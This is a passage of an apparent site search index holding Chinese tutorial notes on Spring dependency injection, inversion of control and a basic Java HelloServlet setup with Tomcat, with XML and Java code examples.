HelloSpring","title":"\u6784\u9020\u5668\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#set\u65b9\u5f0f\u6ce8\u5165","text":"\u4f9d\u8d56\u6ce8\u5165 \u4f9d\u8d56: bean\u5bf9\u8c61\u7684\u521b\u5efa\u4f9d\u8d56\u4e8e\u5bb9\u5668 \u6ce8\u5165: bean\u5bf9\u8c61\u4e2d\u7684\u6240\u6709\u5c5e\u6027\u7531\u5bb9\u5668\u6765\u6ce8\u5165","title":"Set\u65b9\u5f0f\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6ce8\u5165\u590d\u6742\u7684\u503c","text":"public class Address { private String address ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } public class Student { private Address address ; private String name ; private String [] books ; private List < String > hobbies ; private Map < String , String > card ; private Set < String > games ; private String friend ; private Properties info ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"address\" class= \"top.longlone.Address\" > <property name= \"address\" value= \"https://longlone.top\" /> </bean> <bean id= \"student\" class= \"top.longlone.Student\" > <!--\u666e\u901a\u6ce8\u5165--> <property name= \"name\" value= \"longlone\" /> <!--bean\u6ce8\u5165--> <property name= \"address\" ref= \"address\" /> <!--\u6570\u7ec4\u6ce8\u5165--> <property name= \"books\" > <array> <value> \u8bed\u6587 </value> <value> \u6570\u5b66 </value> <value> \u82f1\u8bed </value> </array> </property> <!--List\u6ce8\u5165--> <property name= \"hobbies\" > <list> <value> \u542c\u6b4c </value> <value> \u6572\u4ee3\u7801 </value> <value> \u5e72\u996d </value> </list> </property> <!--Map\u6ce8\u5165--> <property name= \"card\" > <map> <entry key= \"Boy\" value= \"bbb\" /> <entry key= \"Girl\" value= \"ggg\" /> </map> </property> <!--Set\u6ce8\u5165--> <property name= \"games\" > <set> <value> LOL </value> <value> CF </value> <value> DOTA </value> </set> </property> <!--null\u6ce8\u5165--> <property name= \"friend\" > <null/> </property> <!--Properties\u6ce8\u5165--> <property name= \"info\" > <props> <prop key= \"idcard\" > 2020111111 </prop> <prop key= \"sex\" > 1 </prop> <prop key= \"blog\" > https://longlone.top/ </prop> </props> </property> </bean> </beans>","title":"\u6ce8\u5165\u590d\u6742\u7684\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6269\u5c55\u6ce8\u5165","text":"\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2aBean\u5982\u4e0b package top.longlone ; public class User { private String name ; private int age ; // \u7701\u7565getter setter toStirng Constructor\u65b9\u6cd5 }","title":"\u6269\u5c55\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165","text":"p\u5bf9\u5e94\u7684\u662fproperty\uff0c\u5176\u5b9e\u662fSet\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:p=\"http://www.springframework.org/schema/p\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u6ce8\u5165\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981property\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p= \"http://www.springframework.org/schema/p\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" p:age= \"18\" p:name= \"whoami\" /> </beans>","title":"p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165","text":"c\u5bf9\u5e94\u7684\u662fconstructor\uff0c\u5176\u5b9e\u662f\u6784\u9020\u5668\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:c=\"http://www.springframework.org/schema/c\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u8c03\u7528\u6784\u9020\u5668\u76f4\u63a5\u6ce8\u5165\u7c7b\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981constructor-arg\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c= \"http://www.springframework.org/schema/c\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" /> </beans>","title":"c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u603b\u7ed3","text":"\u4f9d\u8d56\u6ce8\u5165(DI)\u662f\u4e00\u79cd\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u65b9\u5f0f\uff0c\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\uff0c\u901a\u8fc7\u4f7f\u7528\u8005\u5c06\u6240\u9700\u4f9d\u8d56\u6ce8\u5165\u5230\u5bf9\u8c61\u91cc\u3002 Spring\u4e2d\u7684\u4f9d\u8d56\u6ce8\u5165\u65b9\u5f0f\u6709\u4e09\u79cd\uff0c\u5206\u522b\u4e3a\u6784\u9020\u5668\u6ce8\u5165\uff0cSet\u65b9\u5f0f\u6ce8\u5165\u548c\u6269\u5c55\u6ce8\u5165\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/","text":"\u63a7\u5236\u53cd\u8f6c(IOC) # \u63a7\u5236\u53cd\u8f6c(IOC) \u662f\u4e00\u79cd\u8bbe\u8ba1\u601d\u60f3\uff0c\u7528\u4e8e\u964d\u4f4e\u4ee3\u7801\u4e4b\u95f4\u7684\u8026\u5408\u5ea6\u3002 \u4f9d\u8d56\u6ce8\u5165(DI) \u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002 \u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u5c31\u662f\u8bf4\u5bf9\u8c61\u5728\u88ab\u521b\u5efa\u7684\u65f6\u5019\uff0c\u7531\u4e1a\u52a1\u5c42\u5c06\u5176\u6240\u4f9d\u8d56\u7684\u5bf9\u8c61\u7684\u4f20\u9012\u7ed9\u5b83\u3002\u4e5f\u53ef\u4ee5\u8bf4\uff0c\u4f9d\u8d56\u88ab\u6ce8\u5165\u5230\u5bf9\u8c61\u4e2d\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u4f46\u662f\u63a7\u5236\u53cd\u8f6c\u8fd8\u6709\u5176\u4ed6\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u5982 ServiceLocator \u3002 \u4f8b\u5b50 # IOC\u524d # package top.longlone ; public interface Fruit { public String type (); } package top.longlone ; public class Apple implements Fruit { @Override public String type () { return \"Apple\" ; } } ```` ``` java package top.longlone ; public class Banana implements Fruit { @Override public String type () { return \"Banana\" ; }} package top.longlone ; public class User { private Fruit favouriteFruit = new Apple (); // \u8fd9\u91cc\u662f\u5199\u6b7b\u4e86 public void say () { System . out . println ( \"My favourite fruit is \" + favouriteFruit . type ()); } } package top.longlone ; import org.junit.Test ; import static org.junit.Assert.* ; public class UserTest { @Test public void testUser () throws Exception { User user = new User (); user . say (); // output: My favourite fruit is Apple } } \u4ece\u4ee3\u7801\u91cc\u53ef\u4ee5\u770b\u5230User\u7684favouriteFruit\u662f\u5199\u6b7b\u4e86\u7684\u5c5e\u6027\uff0c\u4e1a\u52a1\u5c42\u96be\u4ee5\u4fee\u6539 IOC\u540e # ```java package top.longlone; public class User { private Fruit favouriteFruit; public User(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public User() { } public void setFavouriteFruit(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public Fruit getFavouriteFruit() { return favouriteFruit; } public void say() { System.out.println(\"My favourite fruit is \" + favouriteFruit.type()); } } java package top.longlone; import org.junit.Test; import static org.junit.Assert.*; public class UserTest { @Test public void testUser() throws Exception { User user = new User(new Apple()); // user.setFavouriteFruit(new Banana()); \u6216\u8005\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f user.say(); } } ``` \u53ef\u4ee5\u770b\u5230\u4fee\u6539\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u4e3aUser\u7c7b\u6dfb\u52a0\u4f9d\u8d56\uff0c\u4ece\u800c\u4f7f\u5f97\u4f9d\u8d56\u63a7\u5236\u6743\u4ece\u4ee3\u7801\u5c42\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\uff0c\u5b9e\u73b0\u4e86\u63a7\u5236\u53cd\u8f6c\u3002 loC\u662fSpring\u6846\u67b6\u7684\u6838\u5fc3\u5185\u5bb9\uff0c\u4f7f\u7528\u591a\u79cd\u65b9\u5f0f\u5b8c\u7f8e\u7684\u5b9e\u73b0\u4e86loC\uff0c\u53ef\u4ee5\u4f7f\u7528XML\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\uff0c\u65b0\u7248\u672c\u7684Spring\u4e5f\u53ef\u4ee5\u96f6\u914d\u7f6e\u5b9e\u73b0loC\u3002 \u603b\u7ed3 # \u63a7\u5236\u53cd\u8f6c(IOC)\u662f\u4e00\u4e2a\u8bbe\u8ba1\u601d\u60f3\uff0c\u662f\u5f00\u53d1\u8005\u5c06\u4f9d\u8d56\u5bf9\u8c61\u7684\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\u800c\u4e0d\u662f\u5f00\u53d1\u8005\u81ea\u5df1\uff0c\u7528\u4e8e\u89e3\u8026(\u964d\u4f4e\u4ee3\u7801\u7684\u8026\u5408\u5ea6)\u3002","title":"\u63a7\u5236\u53cd\u8f6c(IOC)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u63a7\u5236\u53cd\u8f6cioc","text":"\u63a7\u5236\u53cd\u8f6c(IOC) \u662f\u4e00\u79cd\u8bbe\u8ba1\u601d\u60f3\uff0c\u7528\u4e8e\u964d\u4f4e\u4ee3\u7801\u4e4b\u95f4\u7684\u8026\u5408\u5ea6\u3002 \u4f9d\u8d56\u6ce8\u5165(DI) \u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002 \u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u5c31\u662f\u8bf4\u5bf9\u8c61\u5728\u88ab\u521b\u5efa\u7684\u65f6\u5019\uff0c\u7531\u4e1a\u52a1\u5c42\u5c06\u5176\u6240\u4f9d\u8d56\u7684\u5bf9\u8c61\u7684\u4f20\u9012\u7ed9\u5b83\u3002\u4e5f\u53ef\u4ee5\u8bf4\uff0c\u4f9d\u8d56\u88ab\u6ce8\u5165\u5230\u5bf9\u8c61\u4e2d\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u4f46\u662f\u63a7\u5236\u53cd\u8f6c\u8fd8\u6709\u5176\u4ed6\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u5982 ServiceLocator \u3002","title":"\u63a7\u5236\u53cd\u8f6c(IOC)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u4f8b\u5b50","text":"","title":"\u4f8b\u5b50"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#ioc\u524d","text":"package top.longlone ; public interface Fruit { public String type (); } package top.longlone ; public class Apple implements Fruit { @Override public String type () { return \"Apple\" ; } } ```` ``` java package top.longlone ; public class Banana implements Fruit { @Override public String type () { return \"Banana\" ; }} package top.longlone ; public class User { private Fruit favouriteFruit = new Apple (); // \u8fd9\u91cc\u662f\u5199\u6b7b\u4e86 public void say () { System . out . println ( \"My favourite fruit is \" + favouriteFruit . type ()); } } package top.longlone ; import org.junit.Test ; import static org.junit.Assert.* ; public class UserTest { @Test public void testUser () throws Exception { User user = new User (); user . say (); // output: My favourite fruit is Apple } } \u4ece\u4ee3\u7801\u91cc\u53ef\u4ee5\u770b\u5230User\u7684favouriteFruit\u662f\u5199\u6b7b\u4e86\u7684\u5c5e\u6027\uff0c\u4e1a\u52a1\u5c42\u96be\u4ee5\u4fee\u6539","title":"IOC\u524d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#ioc\u540e","text":"```java package top.longlone; public class User { private Fruit favouriteFruit; public User(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public User() { } public void setFavouriteFruit(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public Fruit getFavouriteFruit() { return favouriteFruit; } public void say() { System.out.println(\"My favourite fruit is \" + favouriteFruit.type()); } } java package top.longlone; import org.junit.Test; import static org.junit.Assert.*; public class UserTest { @Test public void testUser() throws Exception { User user = new User(new Apple()); // user.setFavouriteFruit(new Banana()); \u6216\u8005\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f user.say(); } } ``` \u53ef\u4ee5\u770b\u5230\u4fee\u6539\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u4e3aUser\u7c7b\u6dfb\u52a0\u4f9d\u8d56\uff0c\u4ece\u800c\u4f7f\u5f97\u4f9d\u8d56\u63a7\u5236\u6743\u4ece\u4ee3\u7801\u5c42\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\uff0c\u5b9e\u73b0\u4e86\u63a7\u5236\u53cd\u8f6c\u3002 loC\u662fSpring\u6846\u67b6\u7684\u6838\u5fc3\u5185\u5bb9\uff0c\u4f7f\u7528\u591a\u79cd\u65b9\u5f0f\u5b8c\u7f8e\u7684\u5b9e\u73b0\u4e86loC\uff0c\u53ef\u4ee5\u4f7f\u7528XML\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\uff0c\u65b0\u7248\u672c\u7684Spring\u4e5f\u53ef\u4ee5\u96f6\u914d\u7f6e\u5b9e\u73b0loC\u3002","title":"IOC\u540e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u603b\u7ed3","text":"\u63a7\u5236\u53cd\u8f6c(IOC)\u662f\u4e00\u4e2a\u8bbe\u8ba1\u601d\u60f3\uff0c\u662f\u5f00\u53d1\u8005\u5c06\u4f9d\u8d56\u5bf9\u8c61\u7684\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\u800c\u4e0d\u662f\u5f00\u53d1\u8005\u81ea\u5df1\uff0c\u7528\u4e8e\u89e3\u8026(\u964d\u4f4e\u4ee3\u7801\u7684\u8026\u5408\u5ea6)\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/","text":"HelloServlet # Servlet \u7b80\u4ecb # Servlet\uff08Server Applet\uff09\uff0c\u5168\u79f0Java Servlet\u3002\u662f\u7528Java\u7f16\u5199\u7684\u670d\u52a1\u5668\u7aef\u7a0b\u5e8f\u3002\u5176\u4e3b\u8981\u529f\u80fd\u5728\u4e8e\u751f\u6210\u52a8\u6001Web\u5185\u5bb9\u3002\u72ed\u4e49\u7684Servlet\u662f\u6307Java\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u5e7f\u4e49\u7684Servlet\u662f\u6307\u4efb\u4f55\u5b9e\u73b0\u4e86\u8fd9\u4e2aServlet\u63a5\u53e3\u7684\u7c7b\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4eba\u4eec\u5c06Servlet\u7406\u89e3\u4e3a\u540e\u8005\u3002 \u60f3\u8981\u5f00\u53d1\u4e00\u4e2aJava Web\u7a0b\u5e8f\uff0c\u53ea\u9700\u8981\u5b8c\u62102\u4e2a\u6b65\u9aa4: 1. \u7f16\u5199\u4e00\u4e2a\u7c7b\uff0c\u5b9e\u73b0Servlet\u63a5\u53e3 2. \u628a\u5f00\u53d1\u597d\u7684Java\u7c7b\u90e8\u7f72\u5230web\u670d\u52a1\u5668\u4e2d \u9879\u76ee\u6784\u5efa # \u6784\u5efa\u4e00\u4e2a\u666e\u901a\u7684maven\u9879\u76ee\uff0c\u5220\u6389src\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7a7a\u5de5\u7a0b\u5c31\u662fmaven\u4e3b\u5de5\u7a0b \u5728\u4e3b\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56 <dependencies> <dependency> <groupId> javax.servlet </groupId> <artifactId> javax.servlet-api </artifactId> <version> 4.0.1 </version> </dependency> <dependency> <groupId> javax.servlet.jsp </groupId> <artifactId> javax.servlet.jsp-api </artifactId> <version> 2.3.3 </version> </dependency> </dependencies> \u5728\u4e3b\u5de5\u7a0b\u4e0b\u9762\u65b0\u5efamaven\u6a21\u5757\uff0c\u521b\u5efa\u4e00\u4e2amaven web\u5b50\u5de5\u7a0b \u5728\u5b50\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0parent\u6807\u7b7e\uff0c\u4ee5\u7ee7\u627f\u4e3b\u5de5\u7a0b\u7684\u4f9d\u8d56 \u4fee\u6539\u5b50\u5de5\u7a0b\u4e0bsrc/main/webapp/WEB-INF/web.xml\u4e3a\u6700\u65b0 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > </web-app > \u5728src/main/\u65b0\u5efajava\u548cresources\u6587\u4ef6\u5939\u5e76\u6807\u8bb0(mark) \u5728\u53f3\u4e0a\u89d2\u4e2d\u6dfb\u52a0Tomcat\u914d\u7f6e\uff0c\u5177\u4f53\u6b65\u9aa4\u53c2\u8003\u4e4b\u524d\u7684 Tomcat \u7b80\u5355\u793a\u4f8b # \u7f16\u5199\u4e00\u4e2a\u7ee7\u627fHttpServlet\u7684\u7c7b \u91cd\u5199 do*** \u65b9\u6cd5\uff0c\u5982 doGet \uff0c doPost package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,Servlet\" ); } } \u7f16\u5199Servlet\u6620\u5c04(src/main/webapp/WEB-INF/web.xml) url-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f: *.\u6269\u5c55\u540d /\u5f00\u5934\uff0c*\u7ed3\u5c3e\u3002 url-pattern\u8fd8\u5b58\u5728\u4f18\u5148\u7ea7\uff0c\u8d8a\u7cbe\u51c6\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8d8a\u6a21\u7cca\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u4f4e\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528/*\u8fd9\u4e2apattern\u6765\u81ea\u5b9a\u4e49404\u754c\u9762\u3002 \u4e00\u4e2aservlet\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u6620\u5c04\u8def\u5f84\u3002 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <!-- \u6ce8\u518cservlet --> <servlet> <servlet-name> hello </servlet-name> <servlet-class> top.longlone.servlet.HelloServlet </servlet-class> </servlet> <!-- \u8bbe\u7f6eservlet\u6620\u5c04 --> <servlet-mapping> <servlet-name> hello </servlet-name> <!-- \u8fd9\u91ccurl-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f \u4e00\u662f*.\u6269\u5c55\u540d \u4e8c\u662f\u4ee5/\u5f00\u5934\uff0c*\u7ed3\u5c3e --> <url-pattern> /hello </url-pattern> </servlet-mapping> </web-app > 4. \u542f\u52a8tomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95ee/hello Servlet\u4e0eTomcat\u5de5\u4f5c\u539f\u7406 # Web Client \u5411Servlet\u5bb9\u5668\uff08Tomcat\uff09\u53d1\u51faHttp\u8bf7\u6c42 Servlet\u5bb9\u5668\u63a5\u6536Web Client\u7684\u8bf7\u6c42 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpRequest\u5bf9\u8c61\uff0c\u5c06Web Client\u8bf7\u6c42\u7684\u4fe1\u606f\u5c01\u88c5\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u3002 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpResponse\u5bf9\u8c61 Servlet\u5bb9\u5668\u8c03\u7528HttpServlet\u5bf9\u8c61\u7684service\u65b9\u6cd5\uff0c\u628aHttpRequest\u5bf9\u8c61\u4e0eHttpResponse\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 HttpServlet \u5bf9\u8c61\u3002 HttpServlet\u8c03\u7528HttpRequest\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u83b7\u53d6Http\u8bf7\u6c42\u4fe1\u606f\u3002 HttpServlet\u8c03\u7528HttpResponse\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u751f\u6210\u54cd\u5e94\u6570\u636e\u3002 Servlet\u5bb9\u5668\u628aHttpServlet\u7684\u54cd\u5e94\u7ed3\u679c\u4f20\u7ed9Web Client\u3002","title":"HelloServlet"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#helloservlet","text":"","title":"HelloServlet"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#servlet-\u7b80\u4ecb","text":"Servlet\uff08Server Applet\uff09\uff0c\u5168\u79f0Java Servlet\u3002\u662f\u7528Java\u7f16\u5199\u7684\u670d\u52a1\u5668\u7aef\u7a0b\u5e8f\u3002\u5176\u4e3b\u8981\u529f\u80fd\u5728\u4e8e\u751f\u6210\u52a8\u6001Web\u5185\u5bb9\u3002\u72ed\u4e49\u7684Servlet\u662f\u6307Java\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u5e7f\u4e49\u7684Servlet\u662f\u6307\u4efb\u4f55\u5b9e\u73b0\u4e86\u8fd9\u4e2aServlet\u63a5\u53e3\u7684\u7c7b\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4eba\u4eec\u5c06Servlet\u7406\u89e3\u4e3a\u540e\u8005\u3002 \u60f3\u8981\u5f00\u53d1\u4e00\u4e2aJava Web\u7a0b\u5e8f\uff0c\u53ea\u9700\u8981\u5b8c\u62102\u4e2a\u6b65\u9aa4: 1. \u7f16\u5199\u4e00\u4e2a\u7c7b\uff0c\u5b9e\u73b0Servlet\u63a5\u53e3 2. \u628a\u5f00\u53d1\u597d\u7684Java\u7c7b\u90e8\u7f72\u5230web\u670d\u52a1\u5668\u4e2d","title":"Servlet \u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#\u9879\u76ee\u6784\u5efa","text":"\u6784\u5efa\u4e00\u4e2a\u666e\u901a\u7684maven\u9879\u76ee\uff0c\u5220\u6389src\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7a7a\u5de5\u7a0b\u5c31\u662fmaven\u4e3b\u5de5\u7a0b \u5728\u4e3b\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56 <dependencies> <dependency> <groupId> javax.servlet </groupId> <artifactId> javax.servlet-api </artifactId> <version> 4.0.1 </version> </dependency> <dependency> <groupId> javax.servlet.jsp </groupId> <artifactId> javax.servlet.jsp-api </artifactId> <version> 2.3.3 </version> </dependency> </dependencies> \u5728\u4e3b\u5de5\u7a0b\u4e0b\u9762\u65b0\u5efamaven\u6a21\u5757\uff0c\u521b\u5efa\u4e00\u4e2amaven web\u5b50\u5de5\u7a0b \u5728\u5b50\u5de5\u7a0b\u7684pom.xml\u4e2d\u6dfb\u52a0parent\u6807\u7b7e\uff0c\u4ee5\u7ee7\u627f\u4e3b\u5de5\u7a0b\u7684\u4f9d\u8d56 \u4fee\u6539\u5b50\u5de5\u7a0b\u4e0bsrc/main/webapp/WEB-INF/web.xml\u4e3a\u6700\u65b0 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > </web-app > \u5728src/main/\u65b0\u5efajava\u548cresources\u6587\u4ef6\u5939\u5e76\u6807\u8bb0(mark) \u5728\u53f3\u4e0a\u89d2\u4e2d\u6dfb\u52a0Tomcat\u914d\u7f6e\uff0c\u5177\u4f53\u6b65\u9aa4\u53c2\u8003\u4e4b\u524d\u7684 Tomcat","title":"\u9879\u76ee\u6784\u5efa"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#\u7b80\u5355\u793a\u4f8b","text":"\u7f16\u5199\u4e00\u4e2a\u7ee7\u627fHttpServlet\u7684\u7c7b \u91cd\u5199 do*** \u65b9\u6cd5\uff0c\u5982 doGet \uff0c doPost package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,Servlet\" ); } } \u7f16\u5199Servlet\u6620\u5c04(src/main/webapp/WEB-INF/web.xml) url-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f: *.\u6269\u5c55\u540d /\u5f00\u5934\uff0c*\u7ed3\u5c3e\u3002 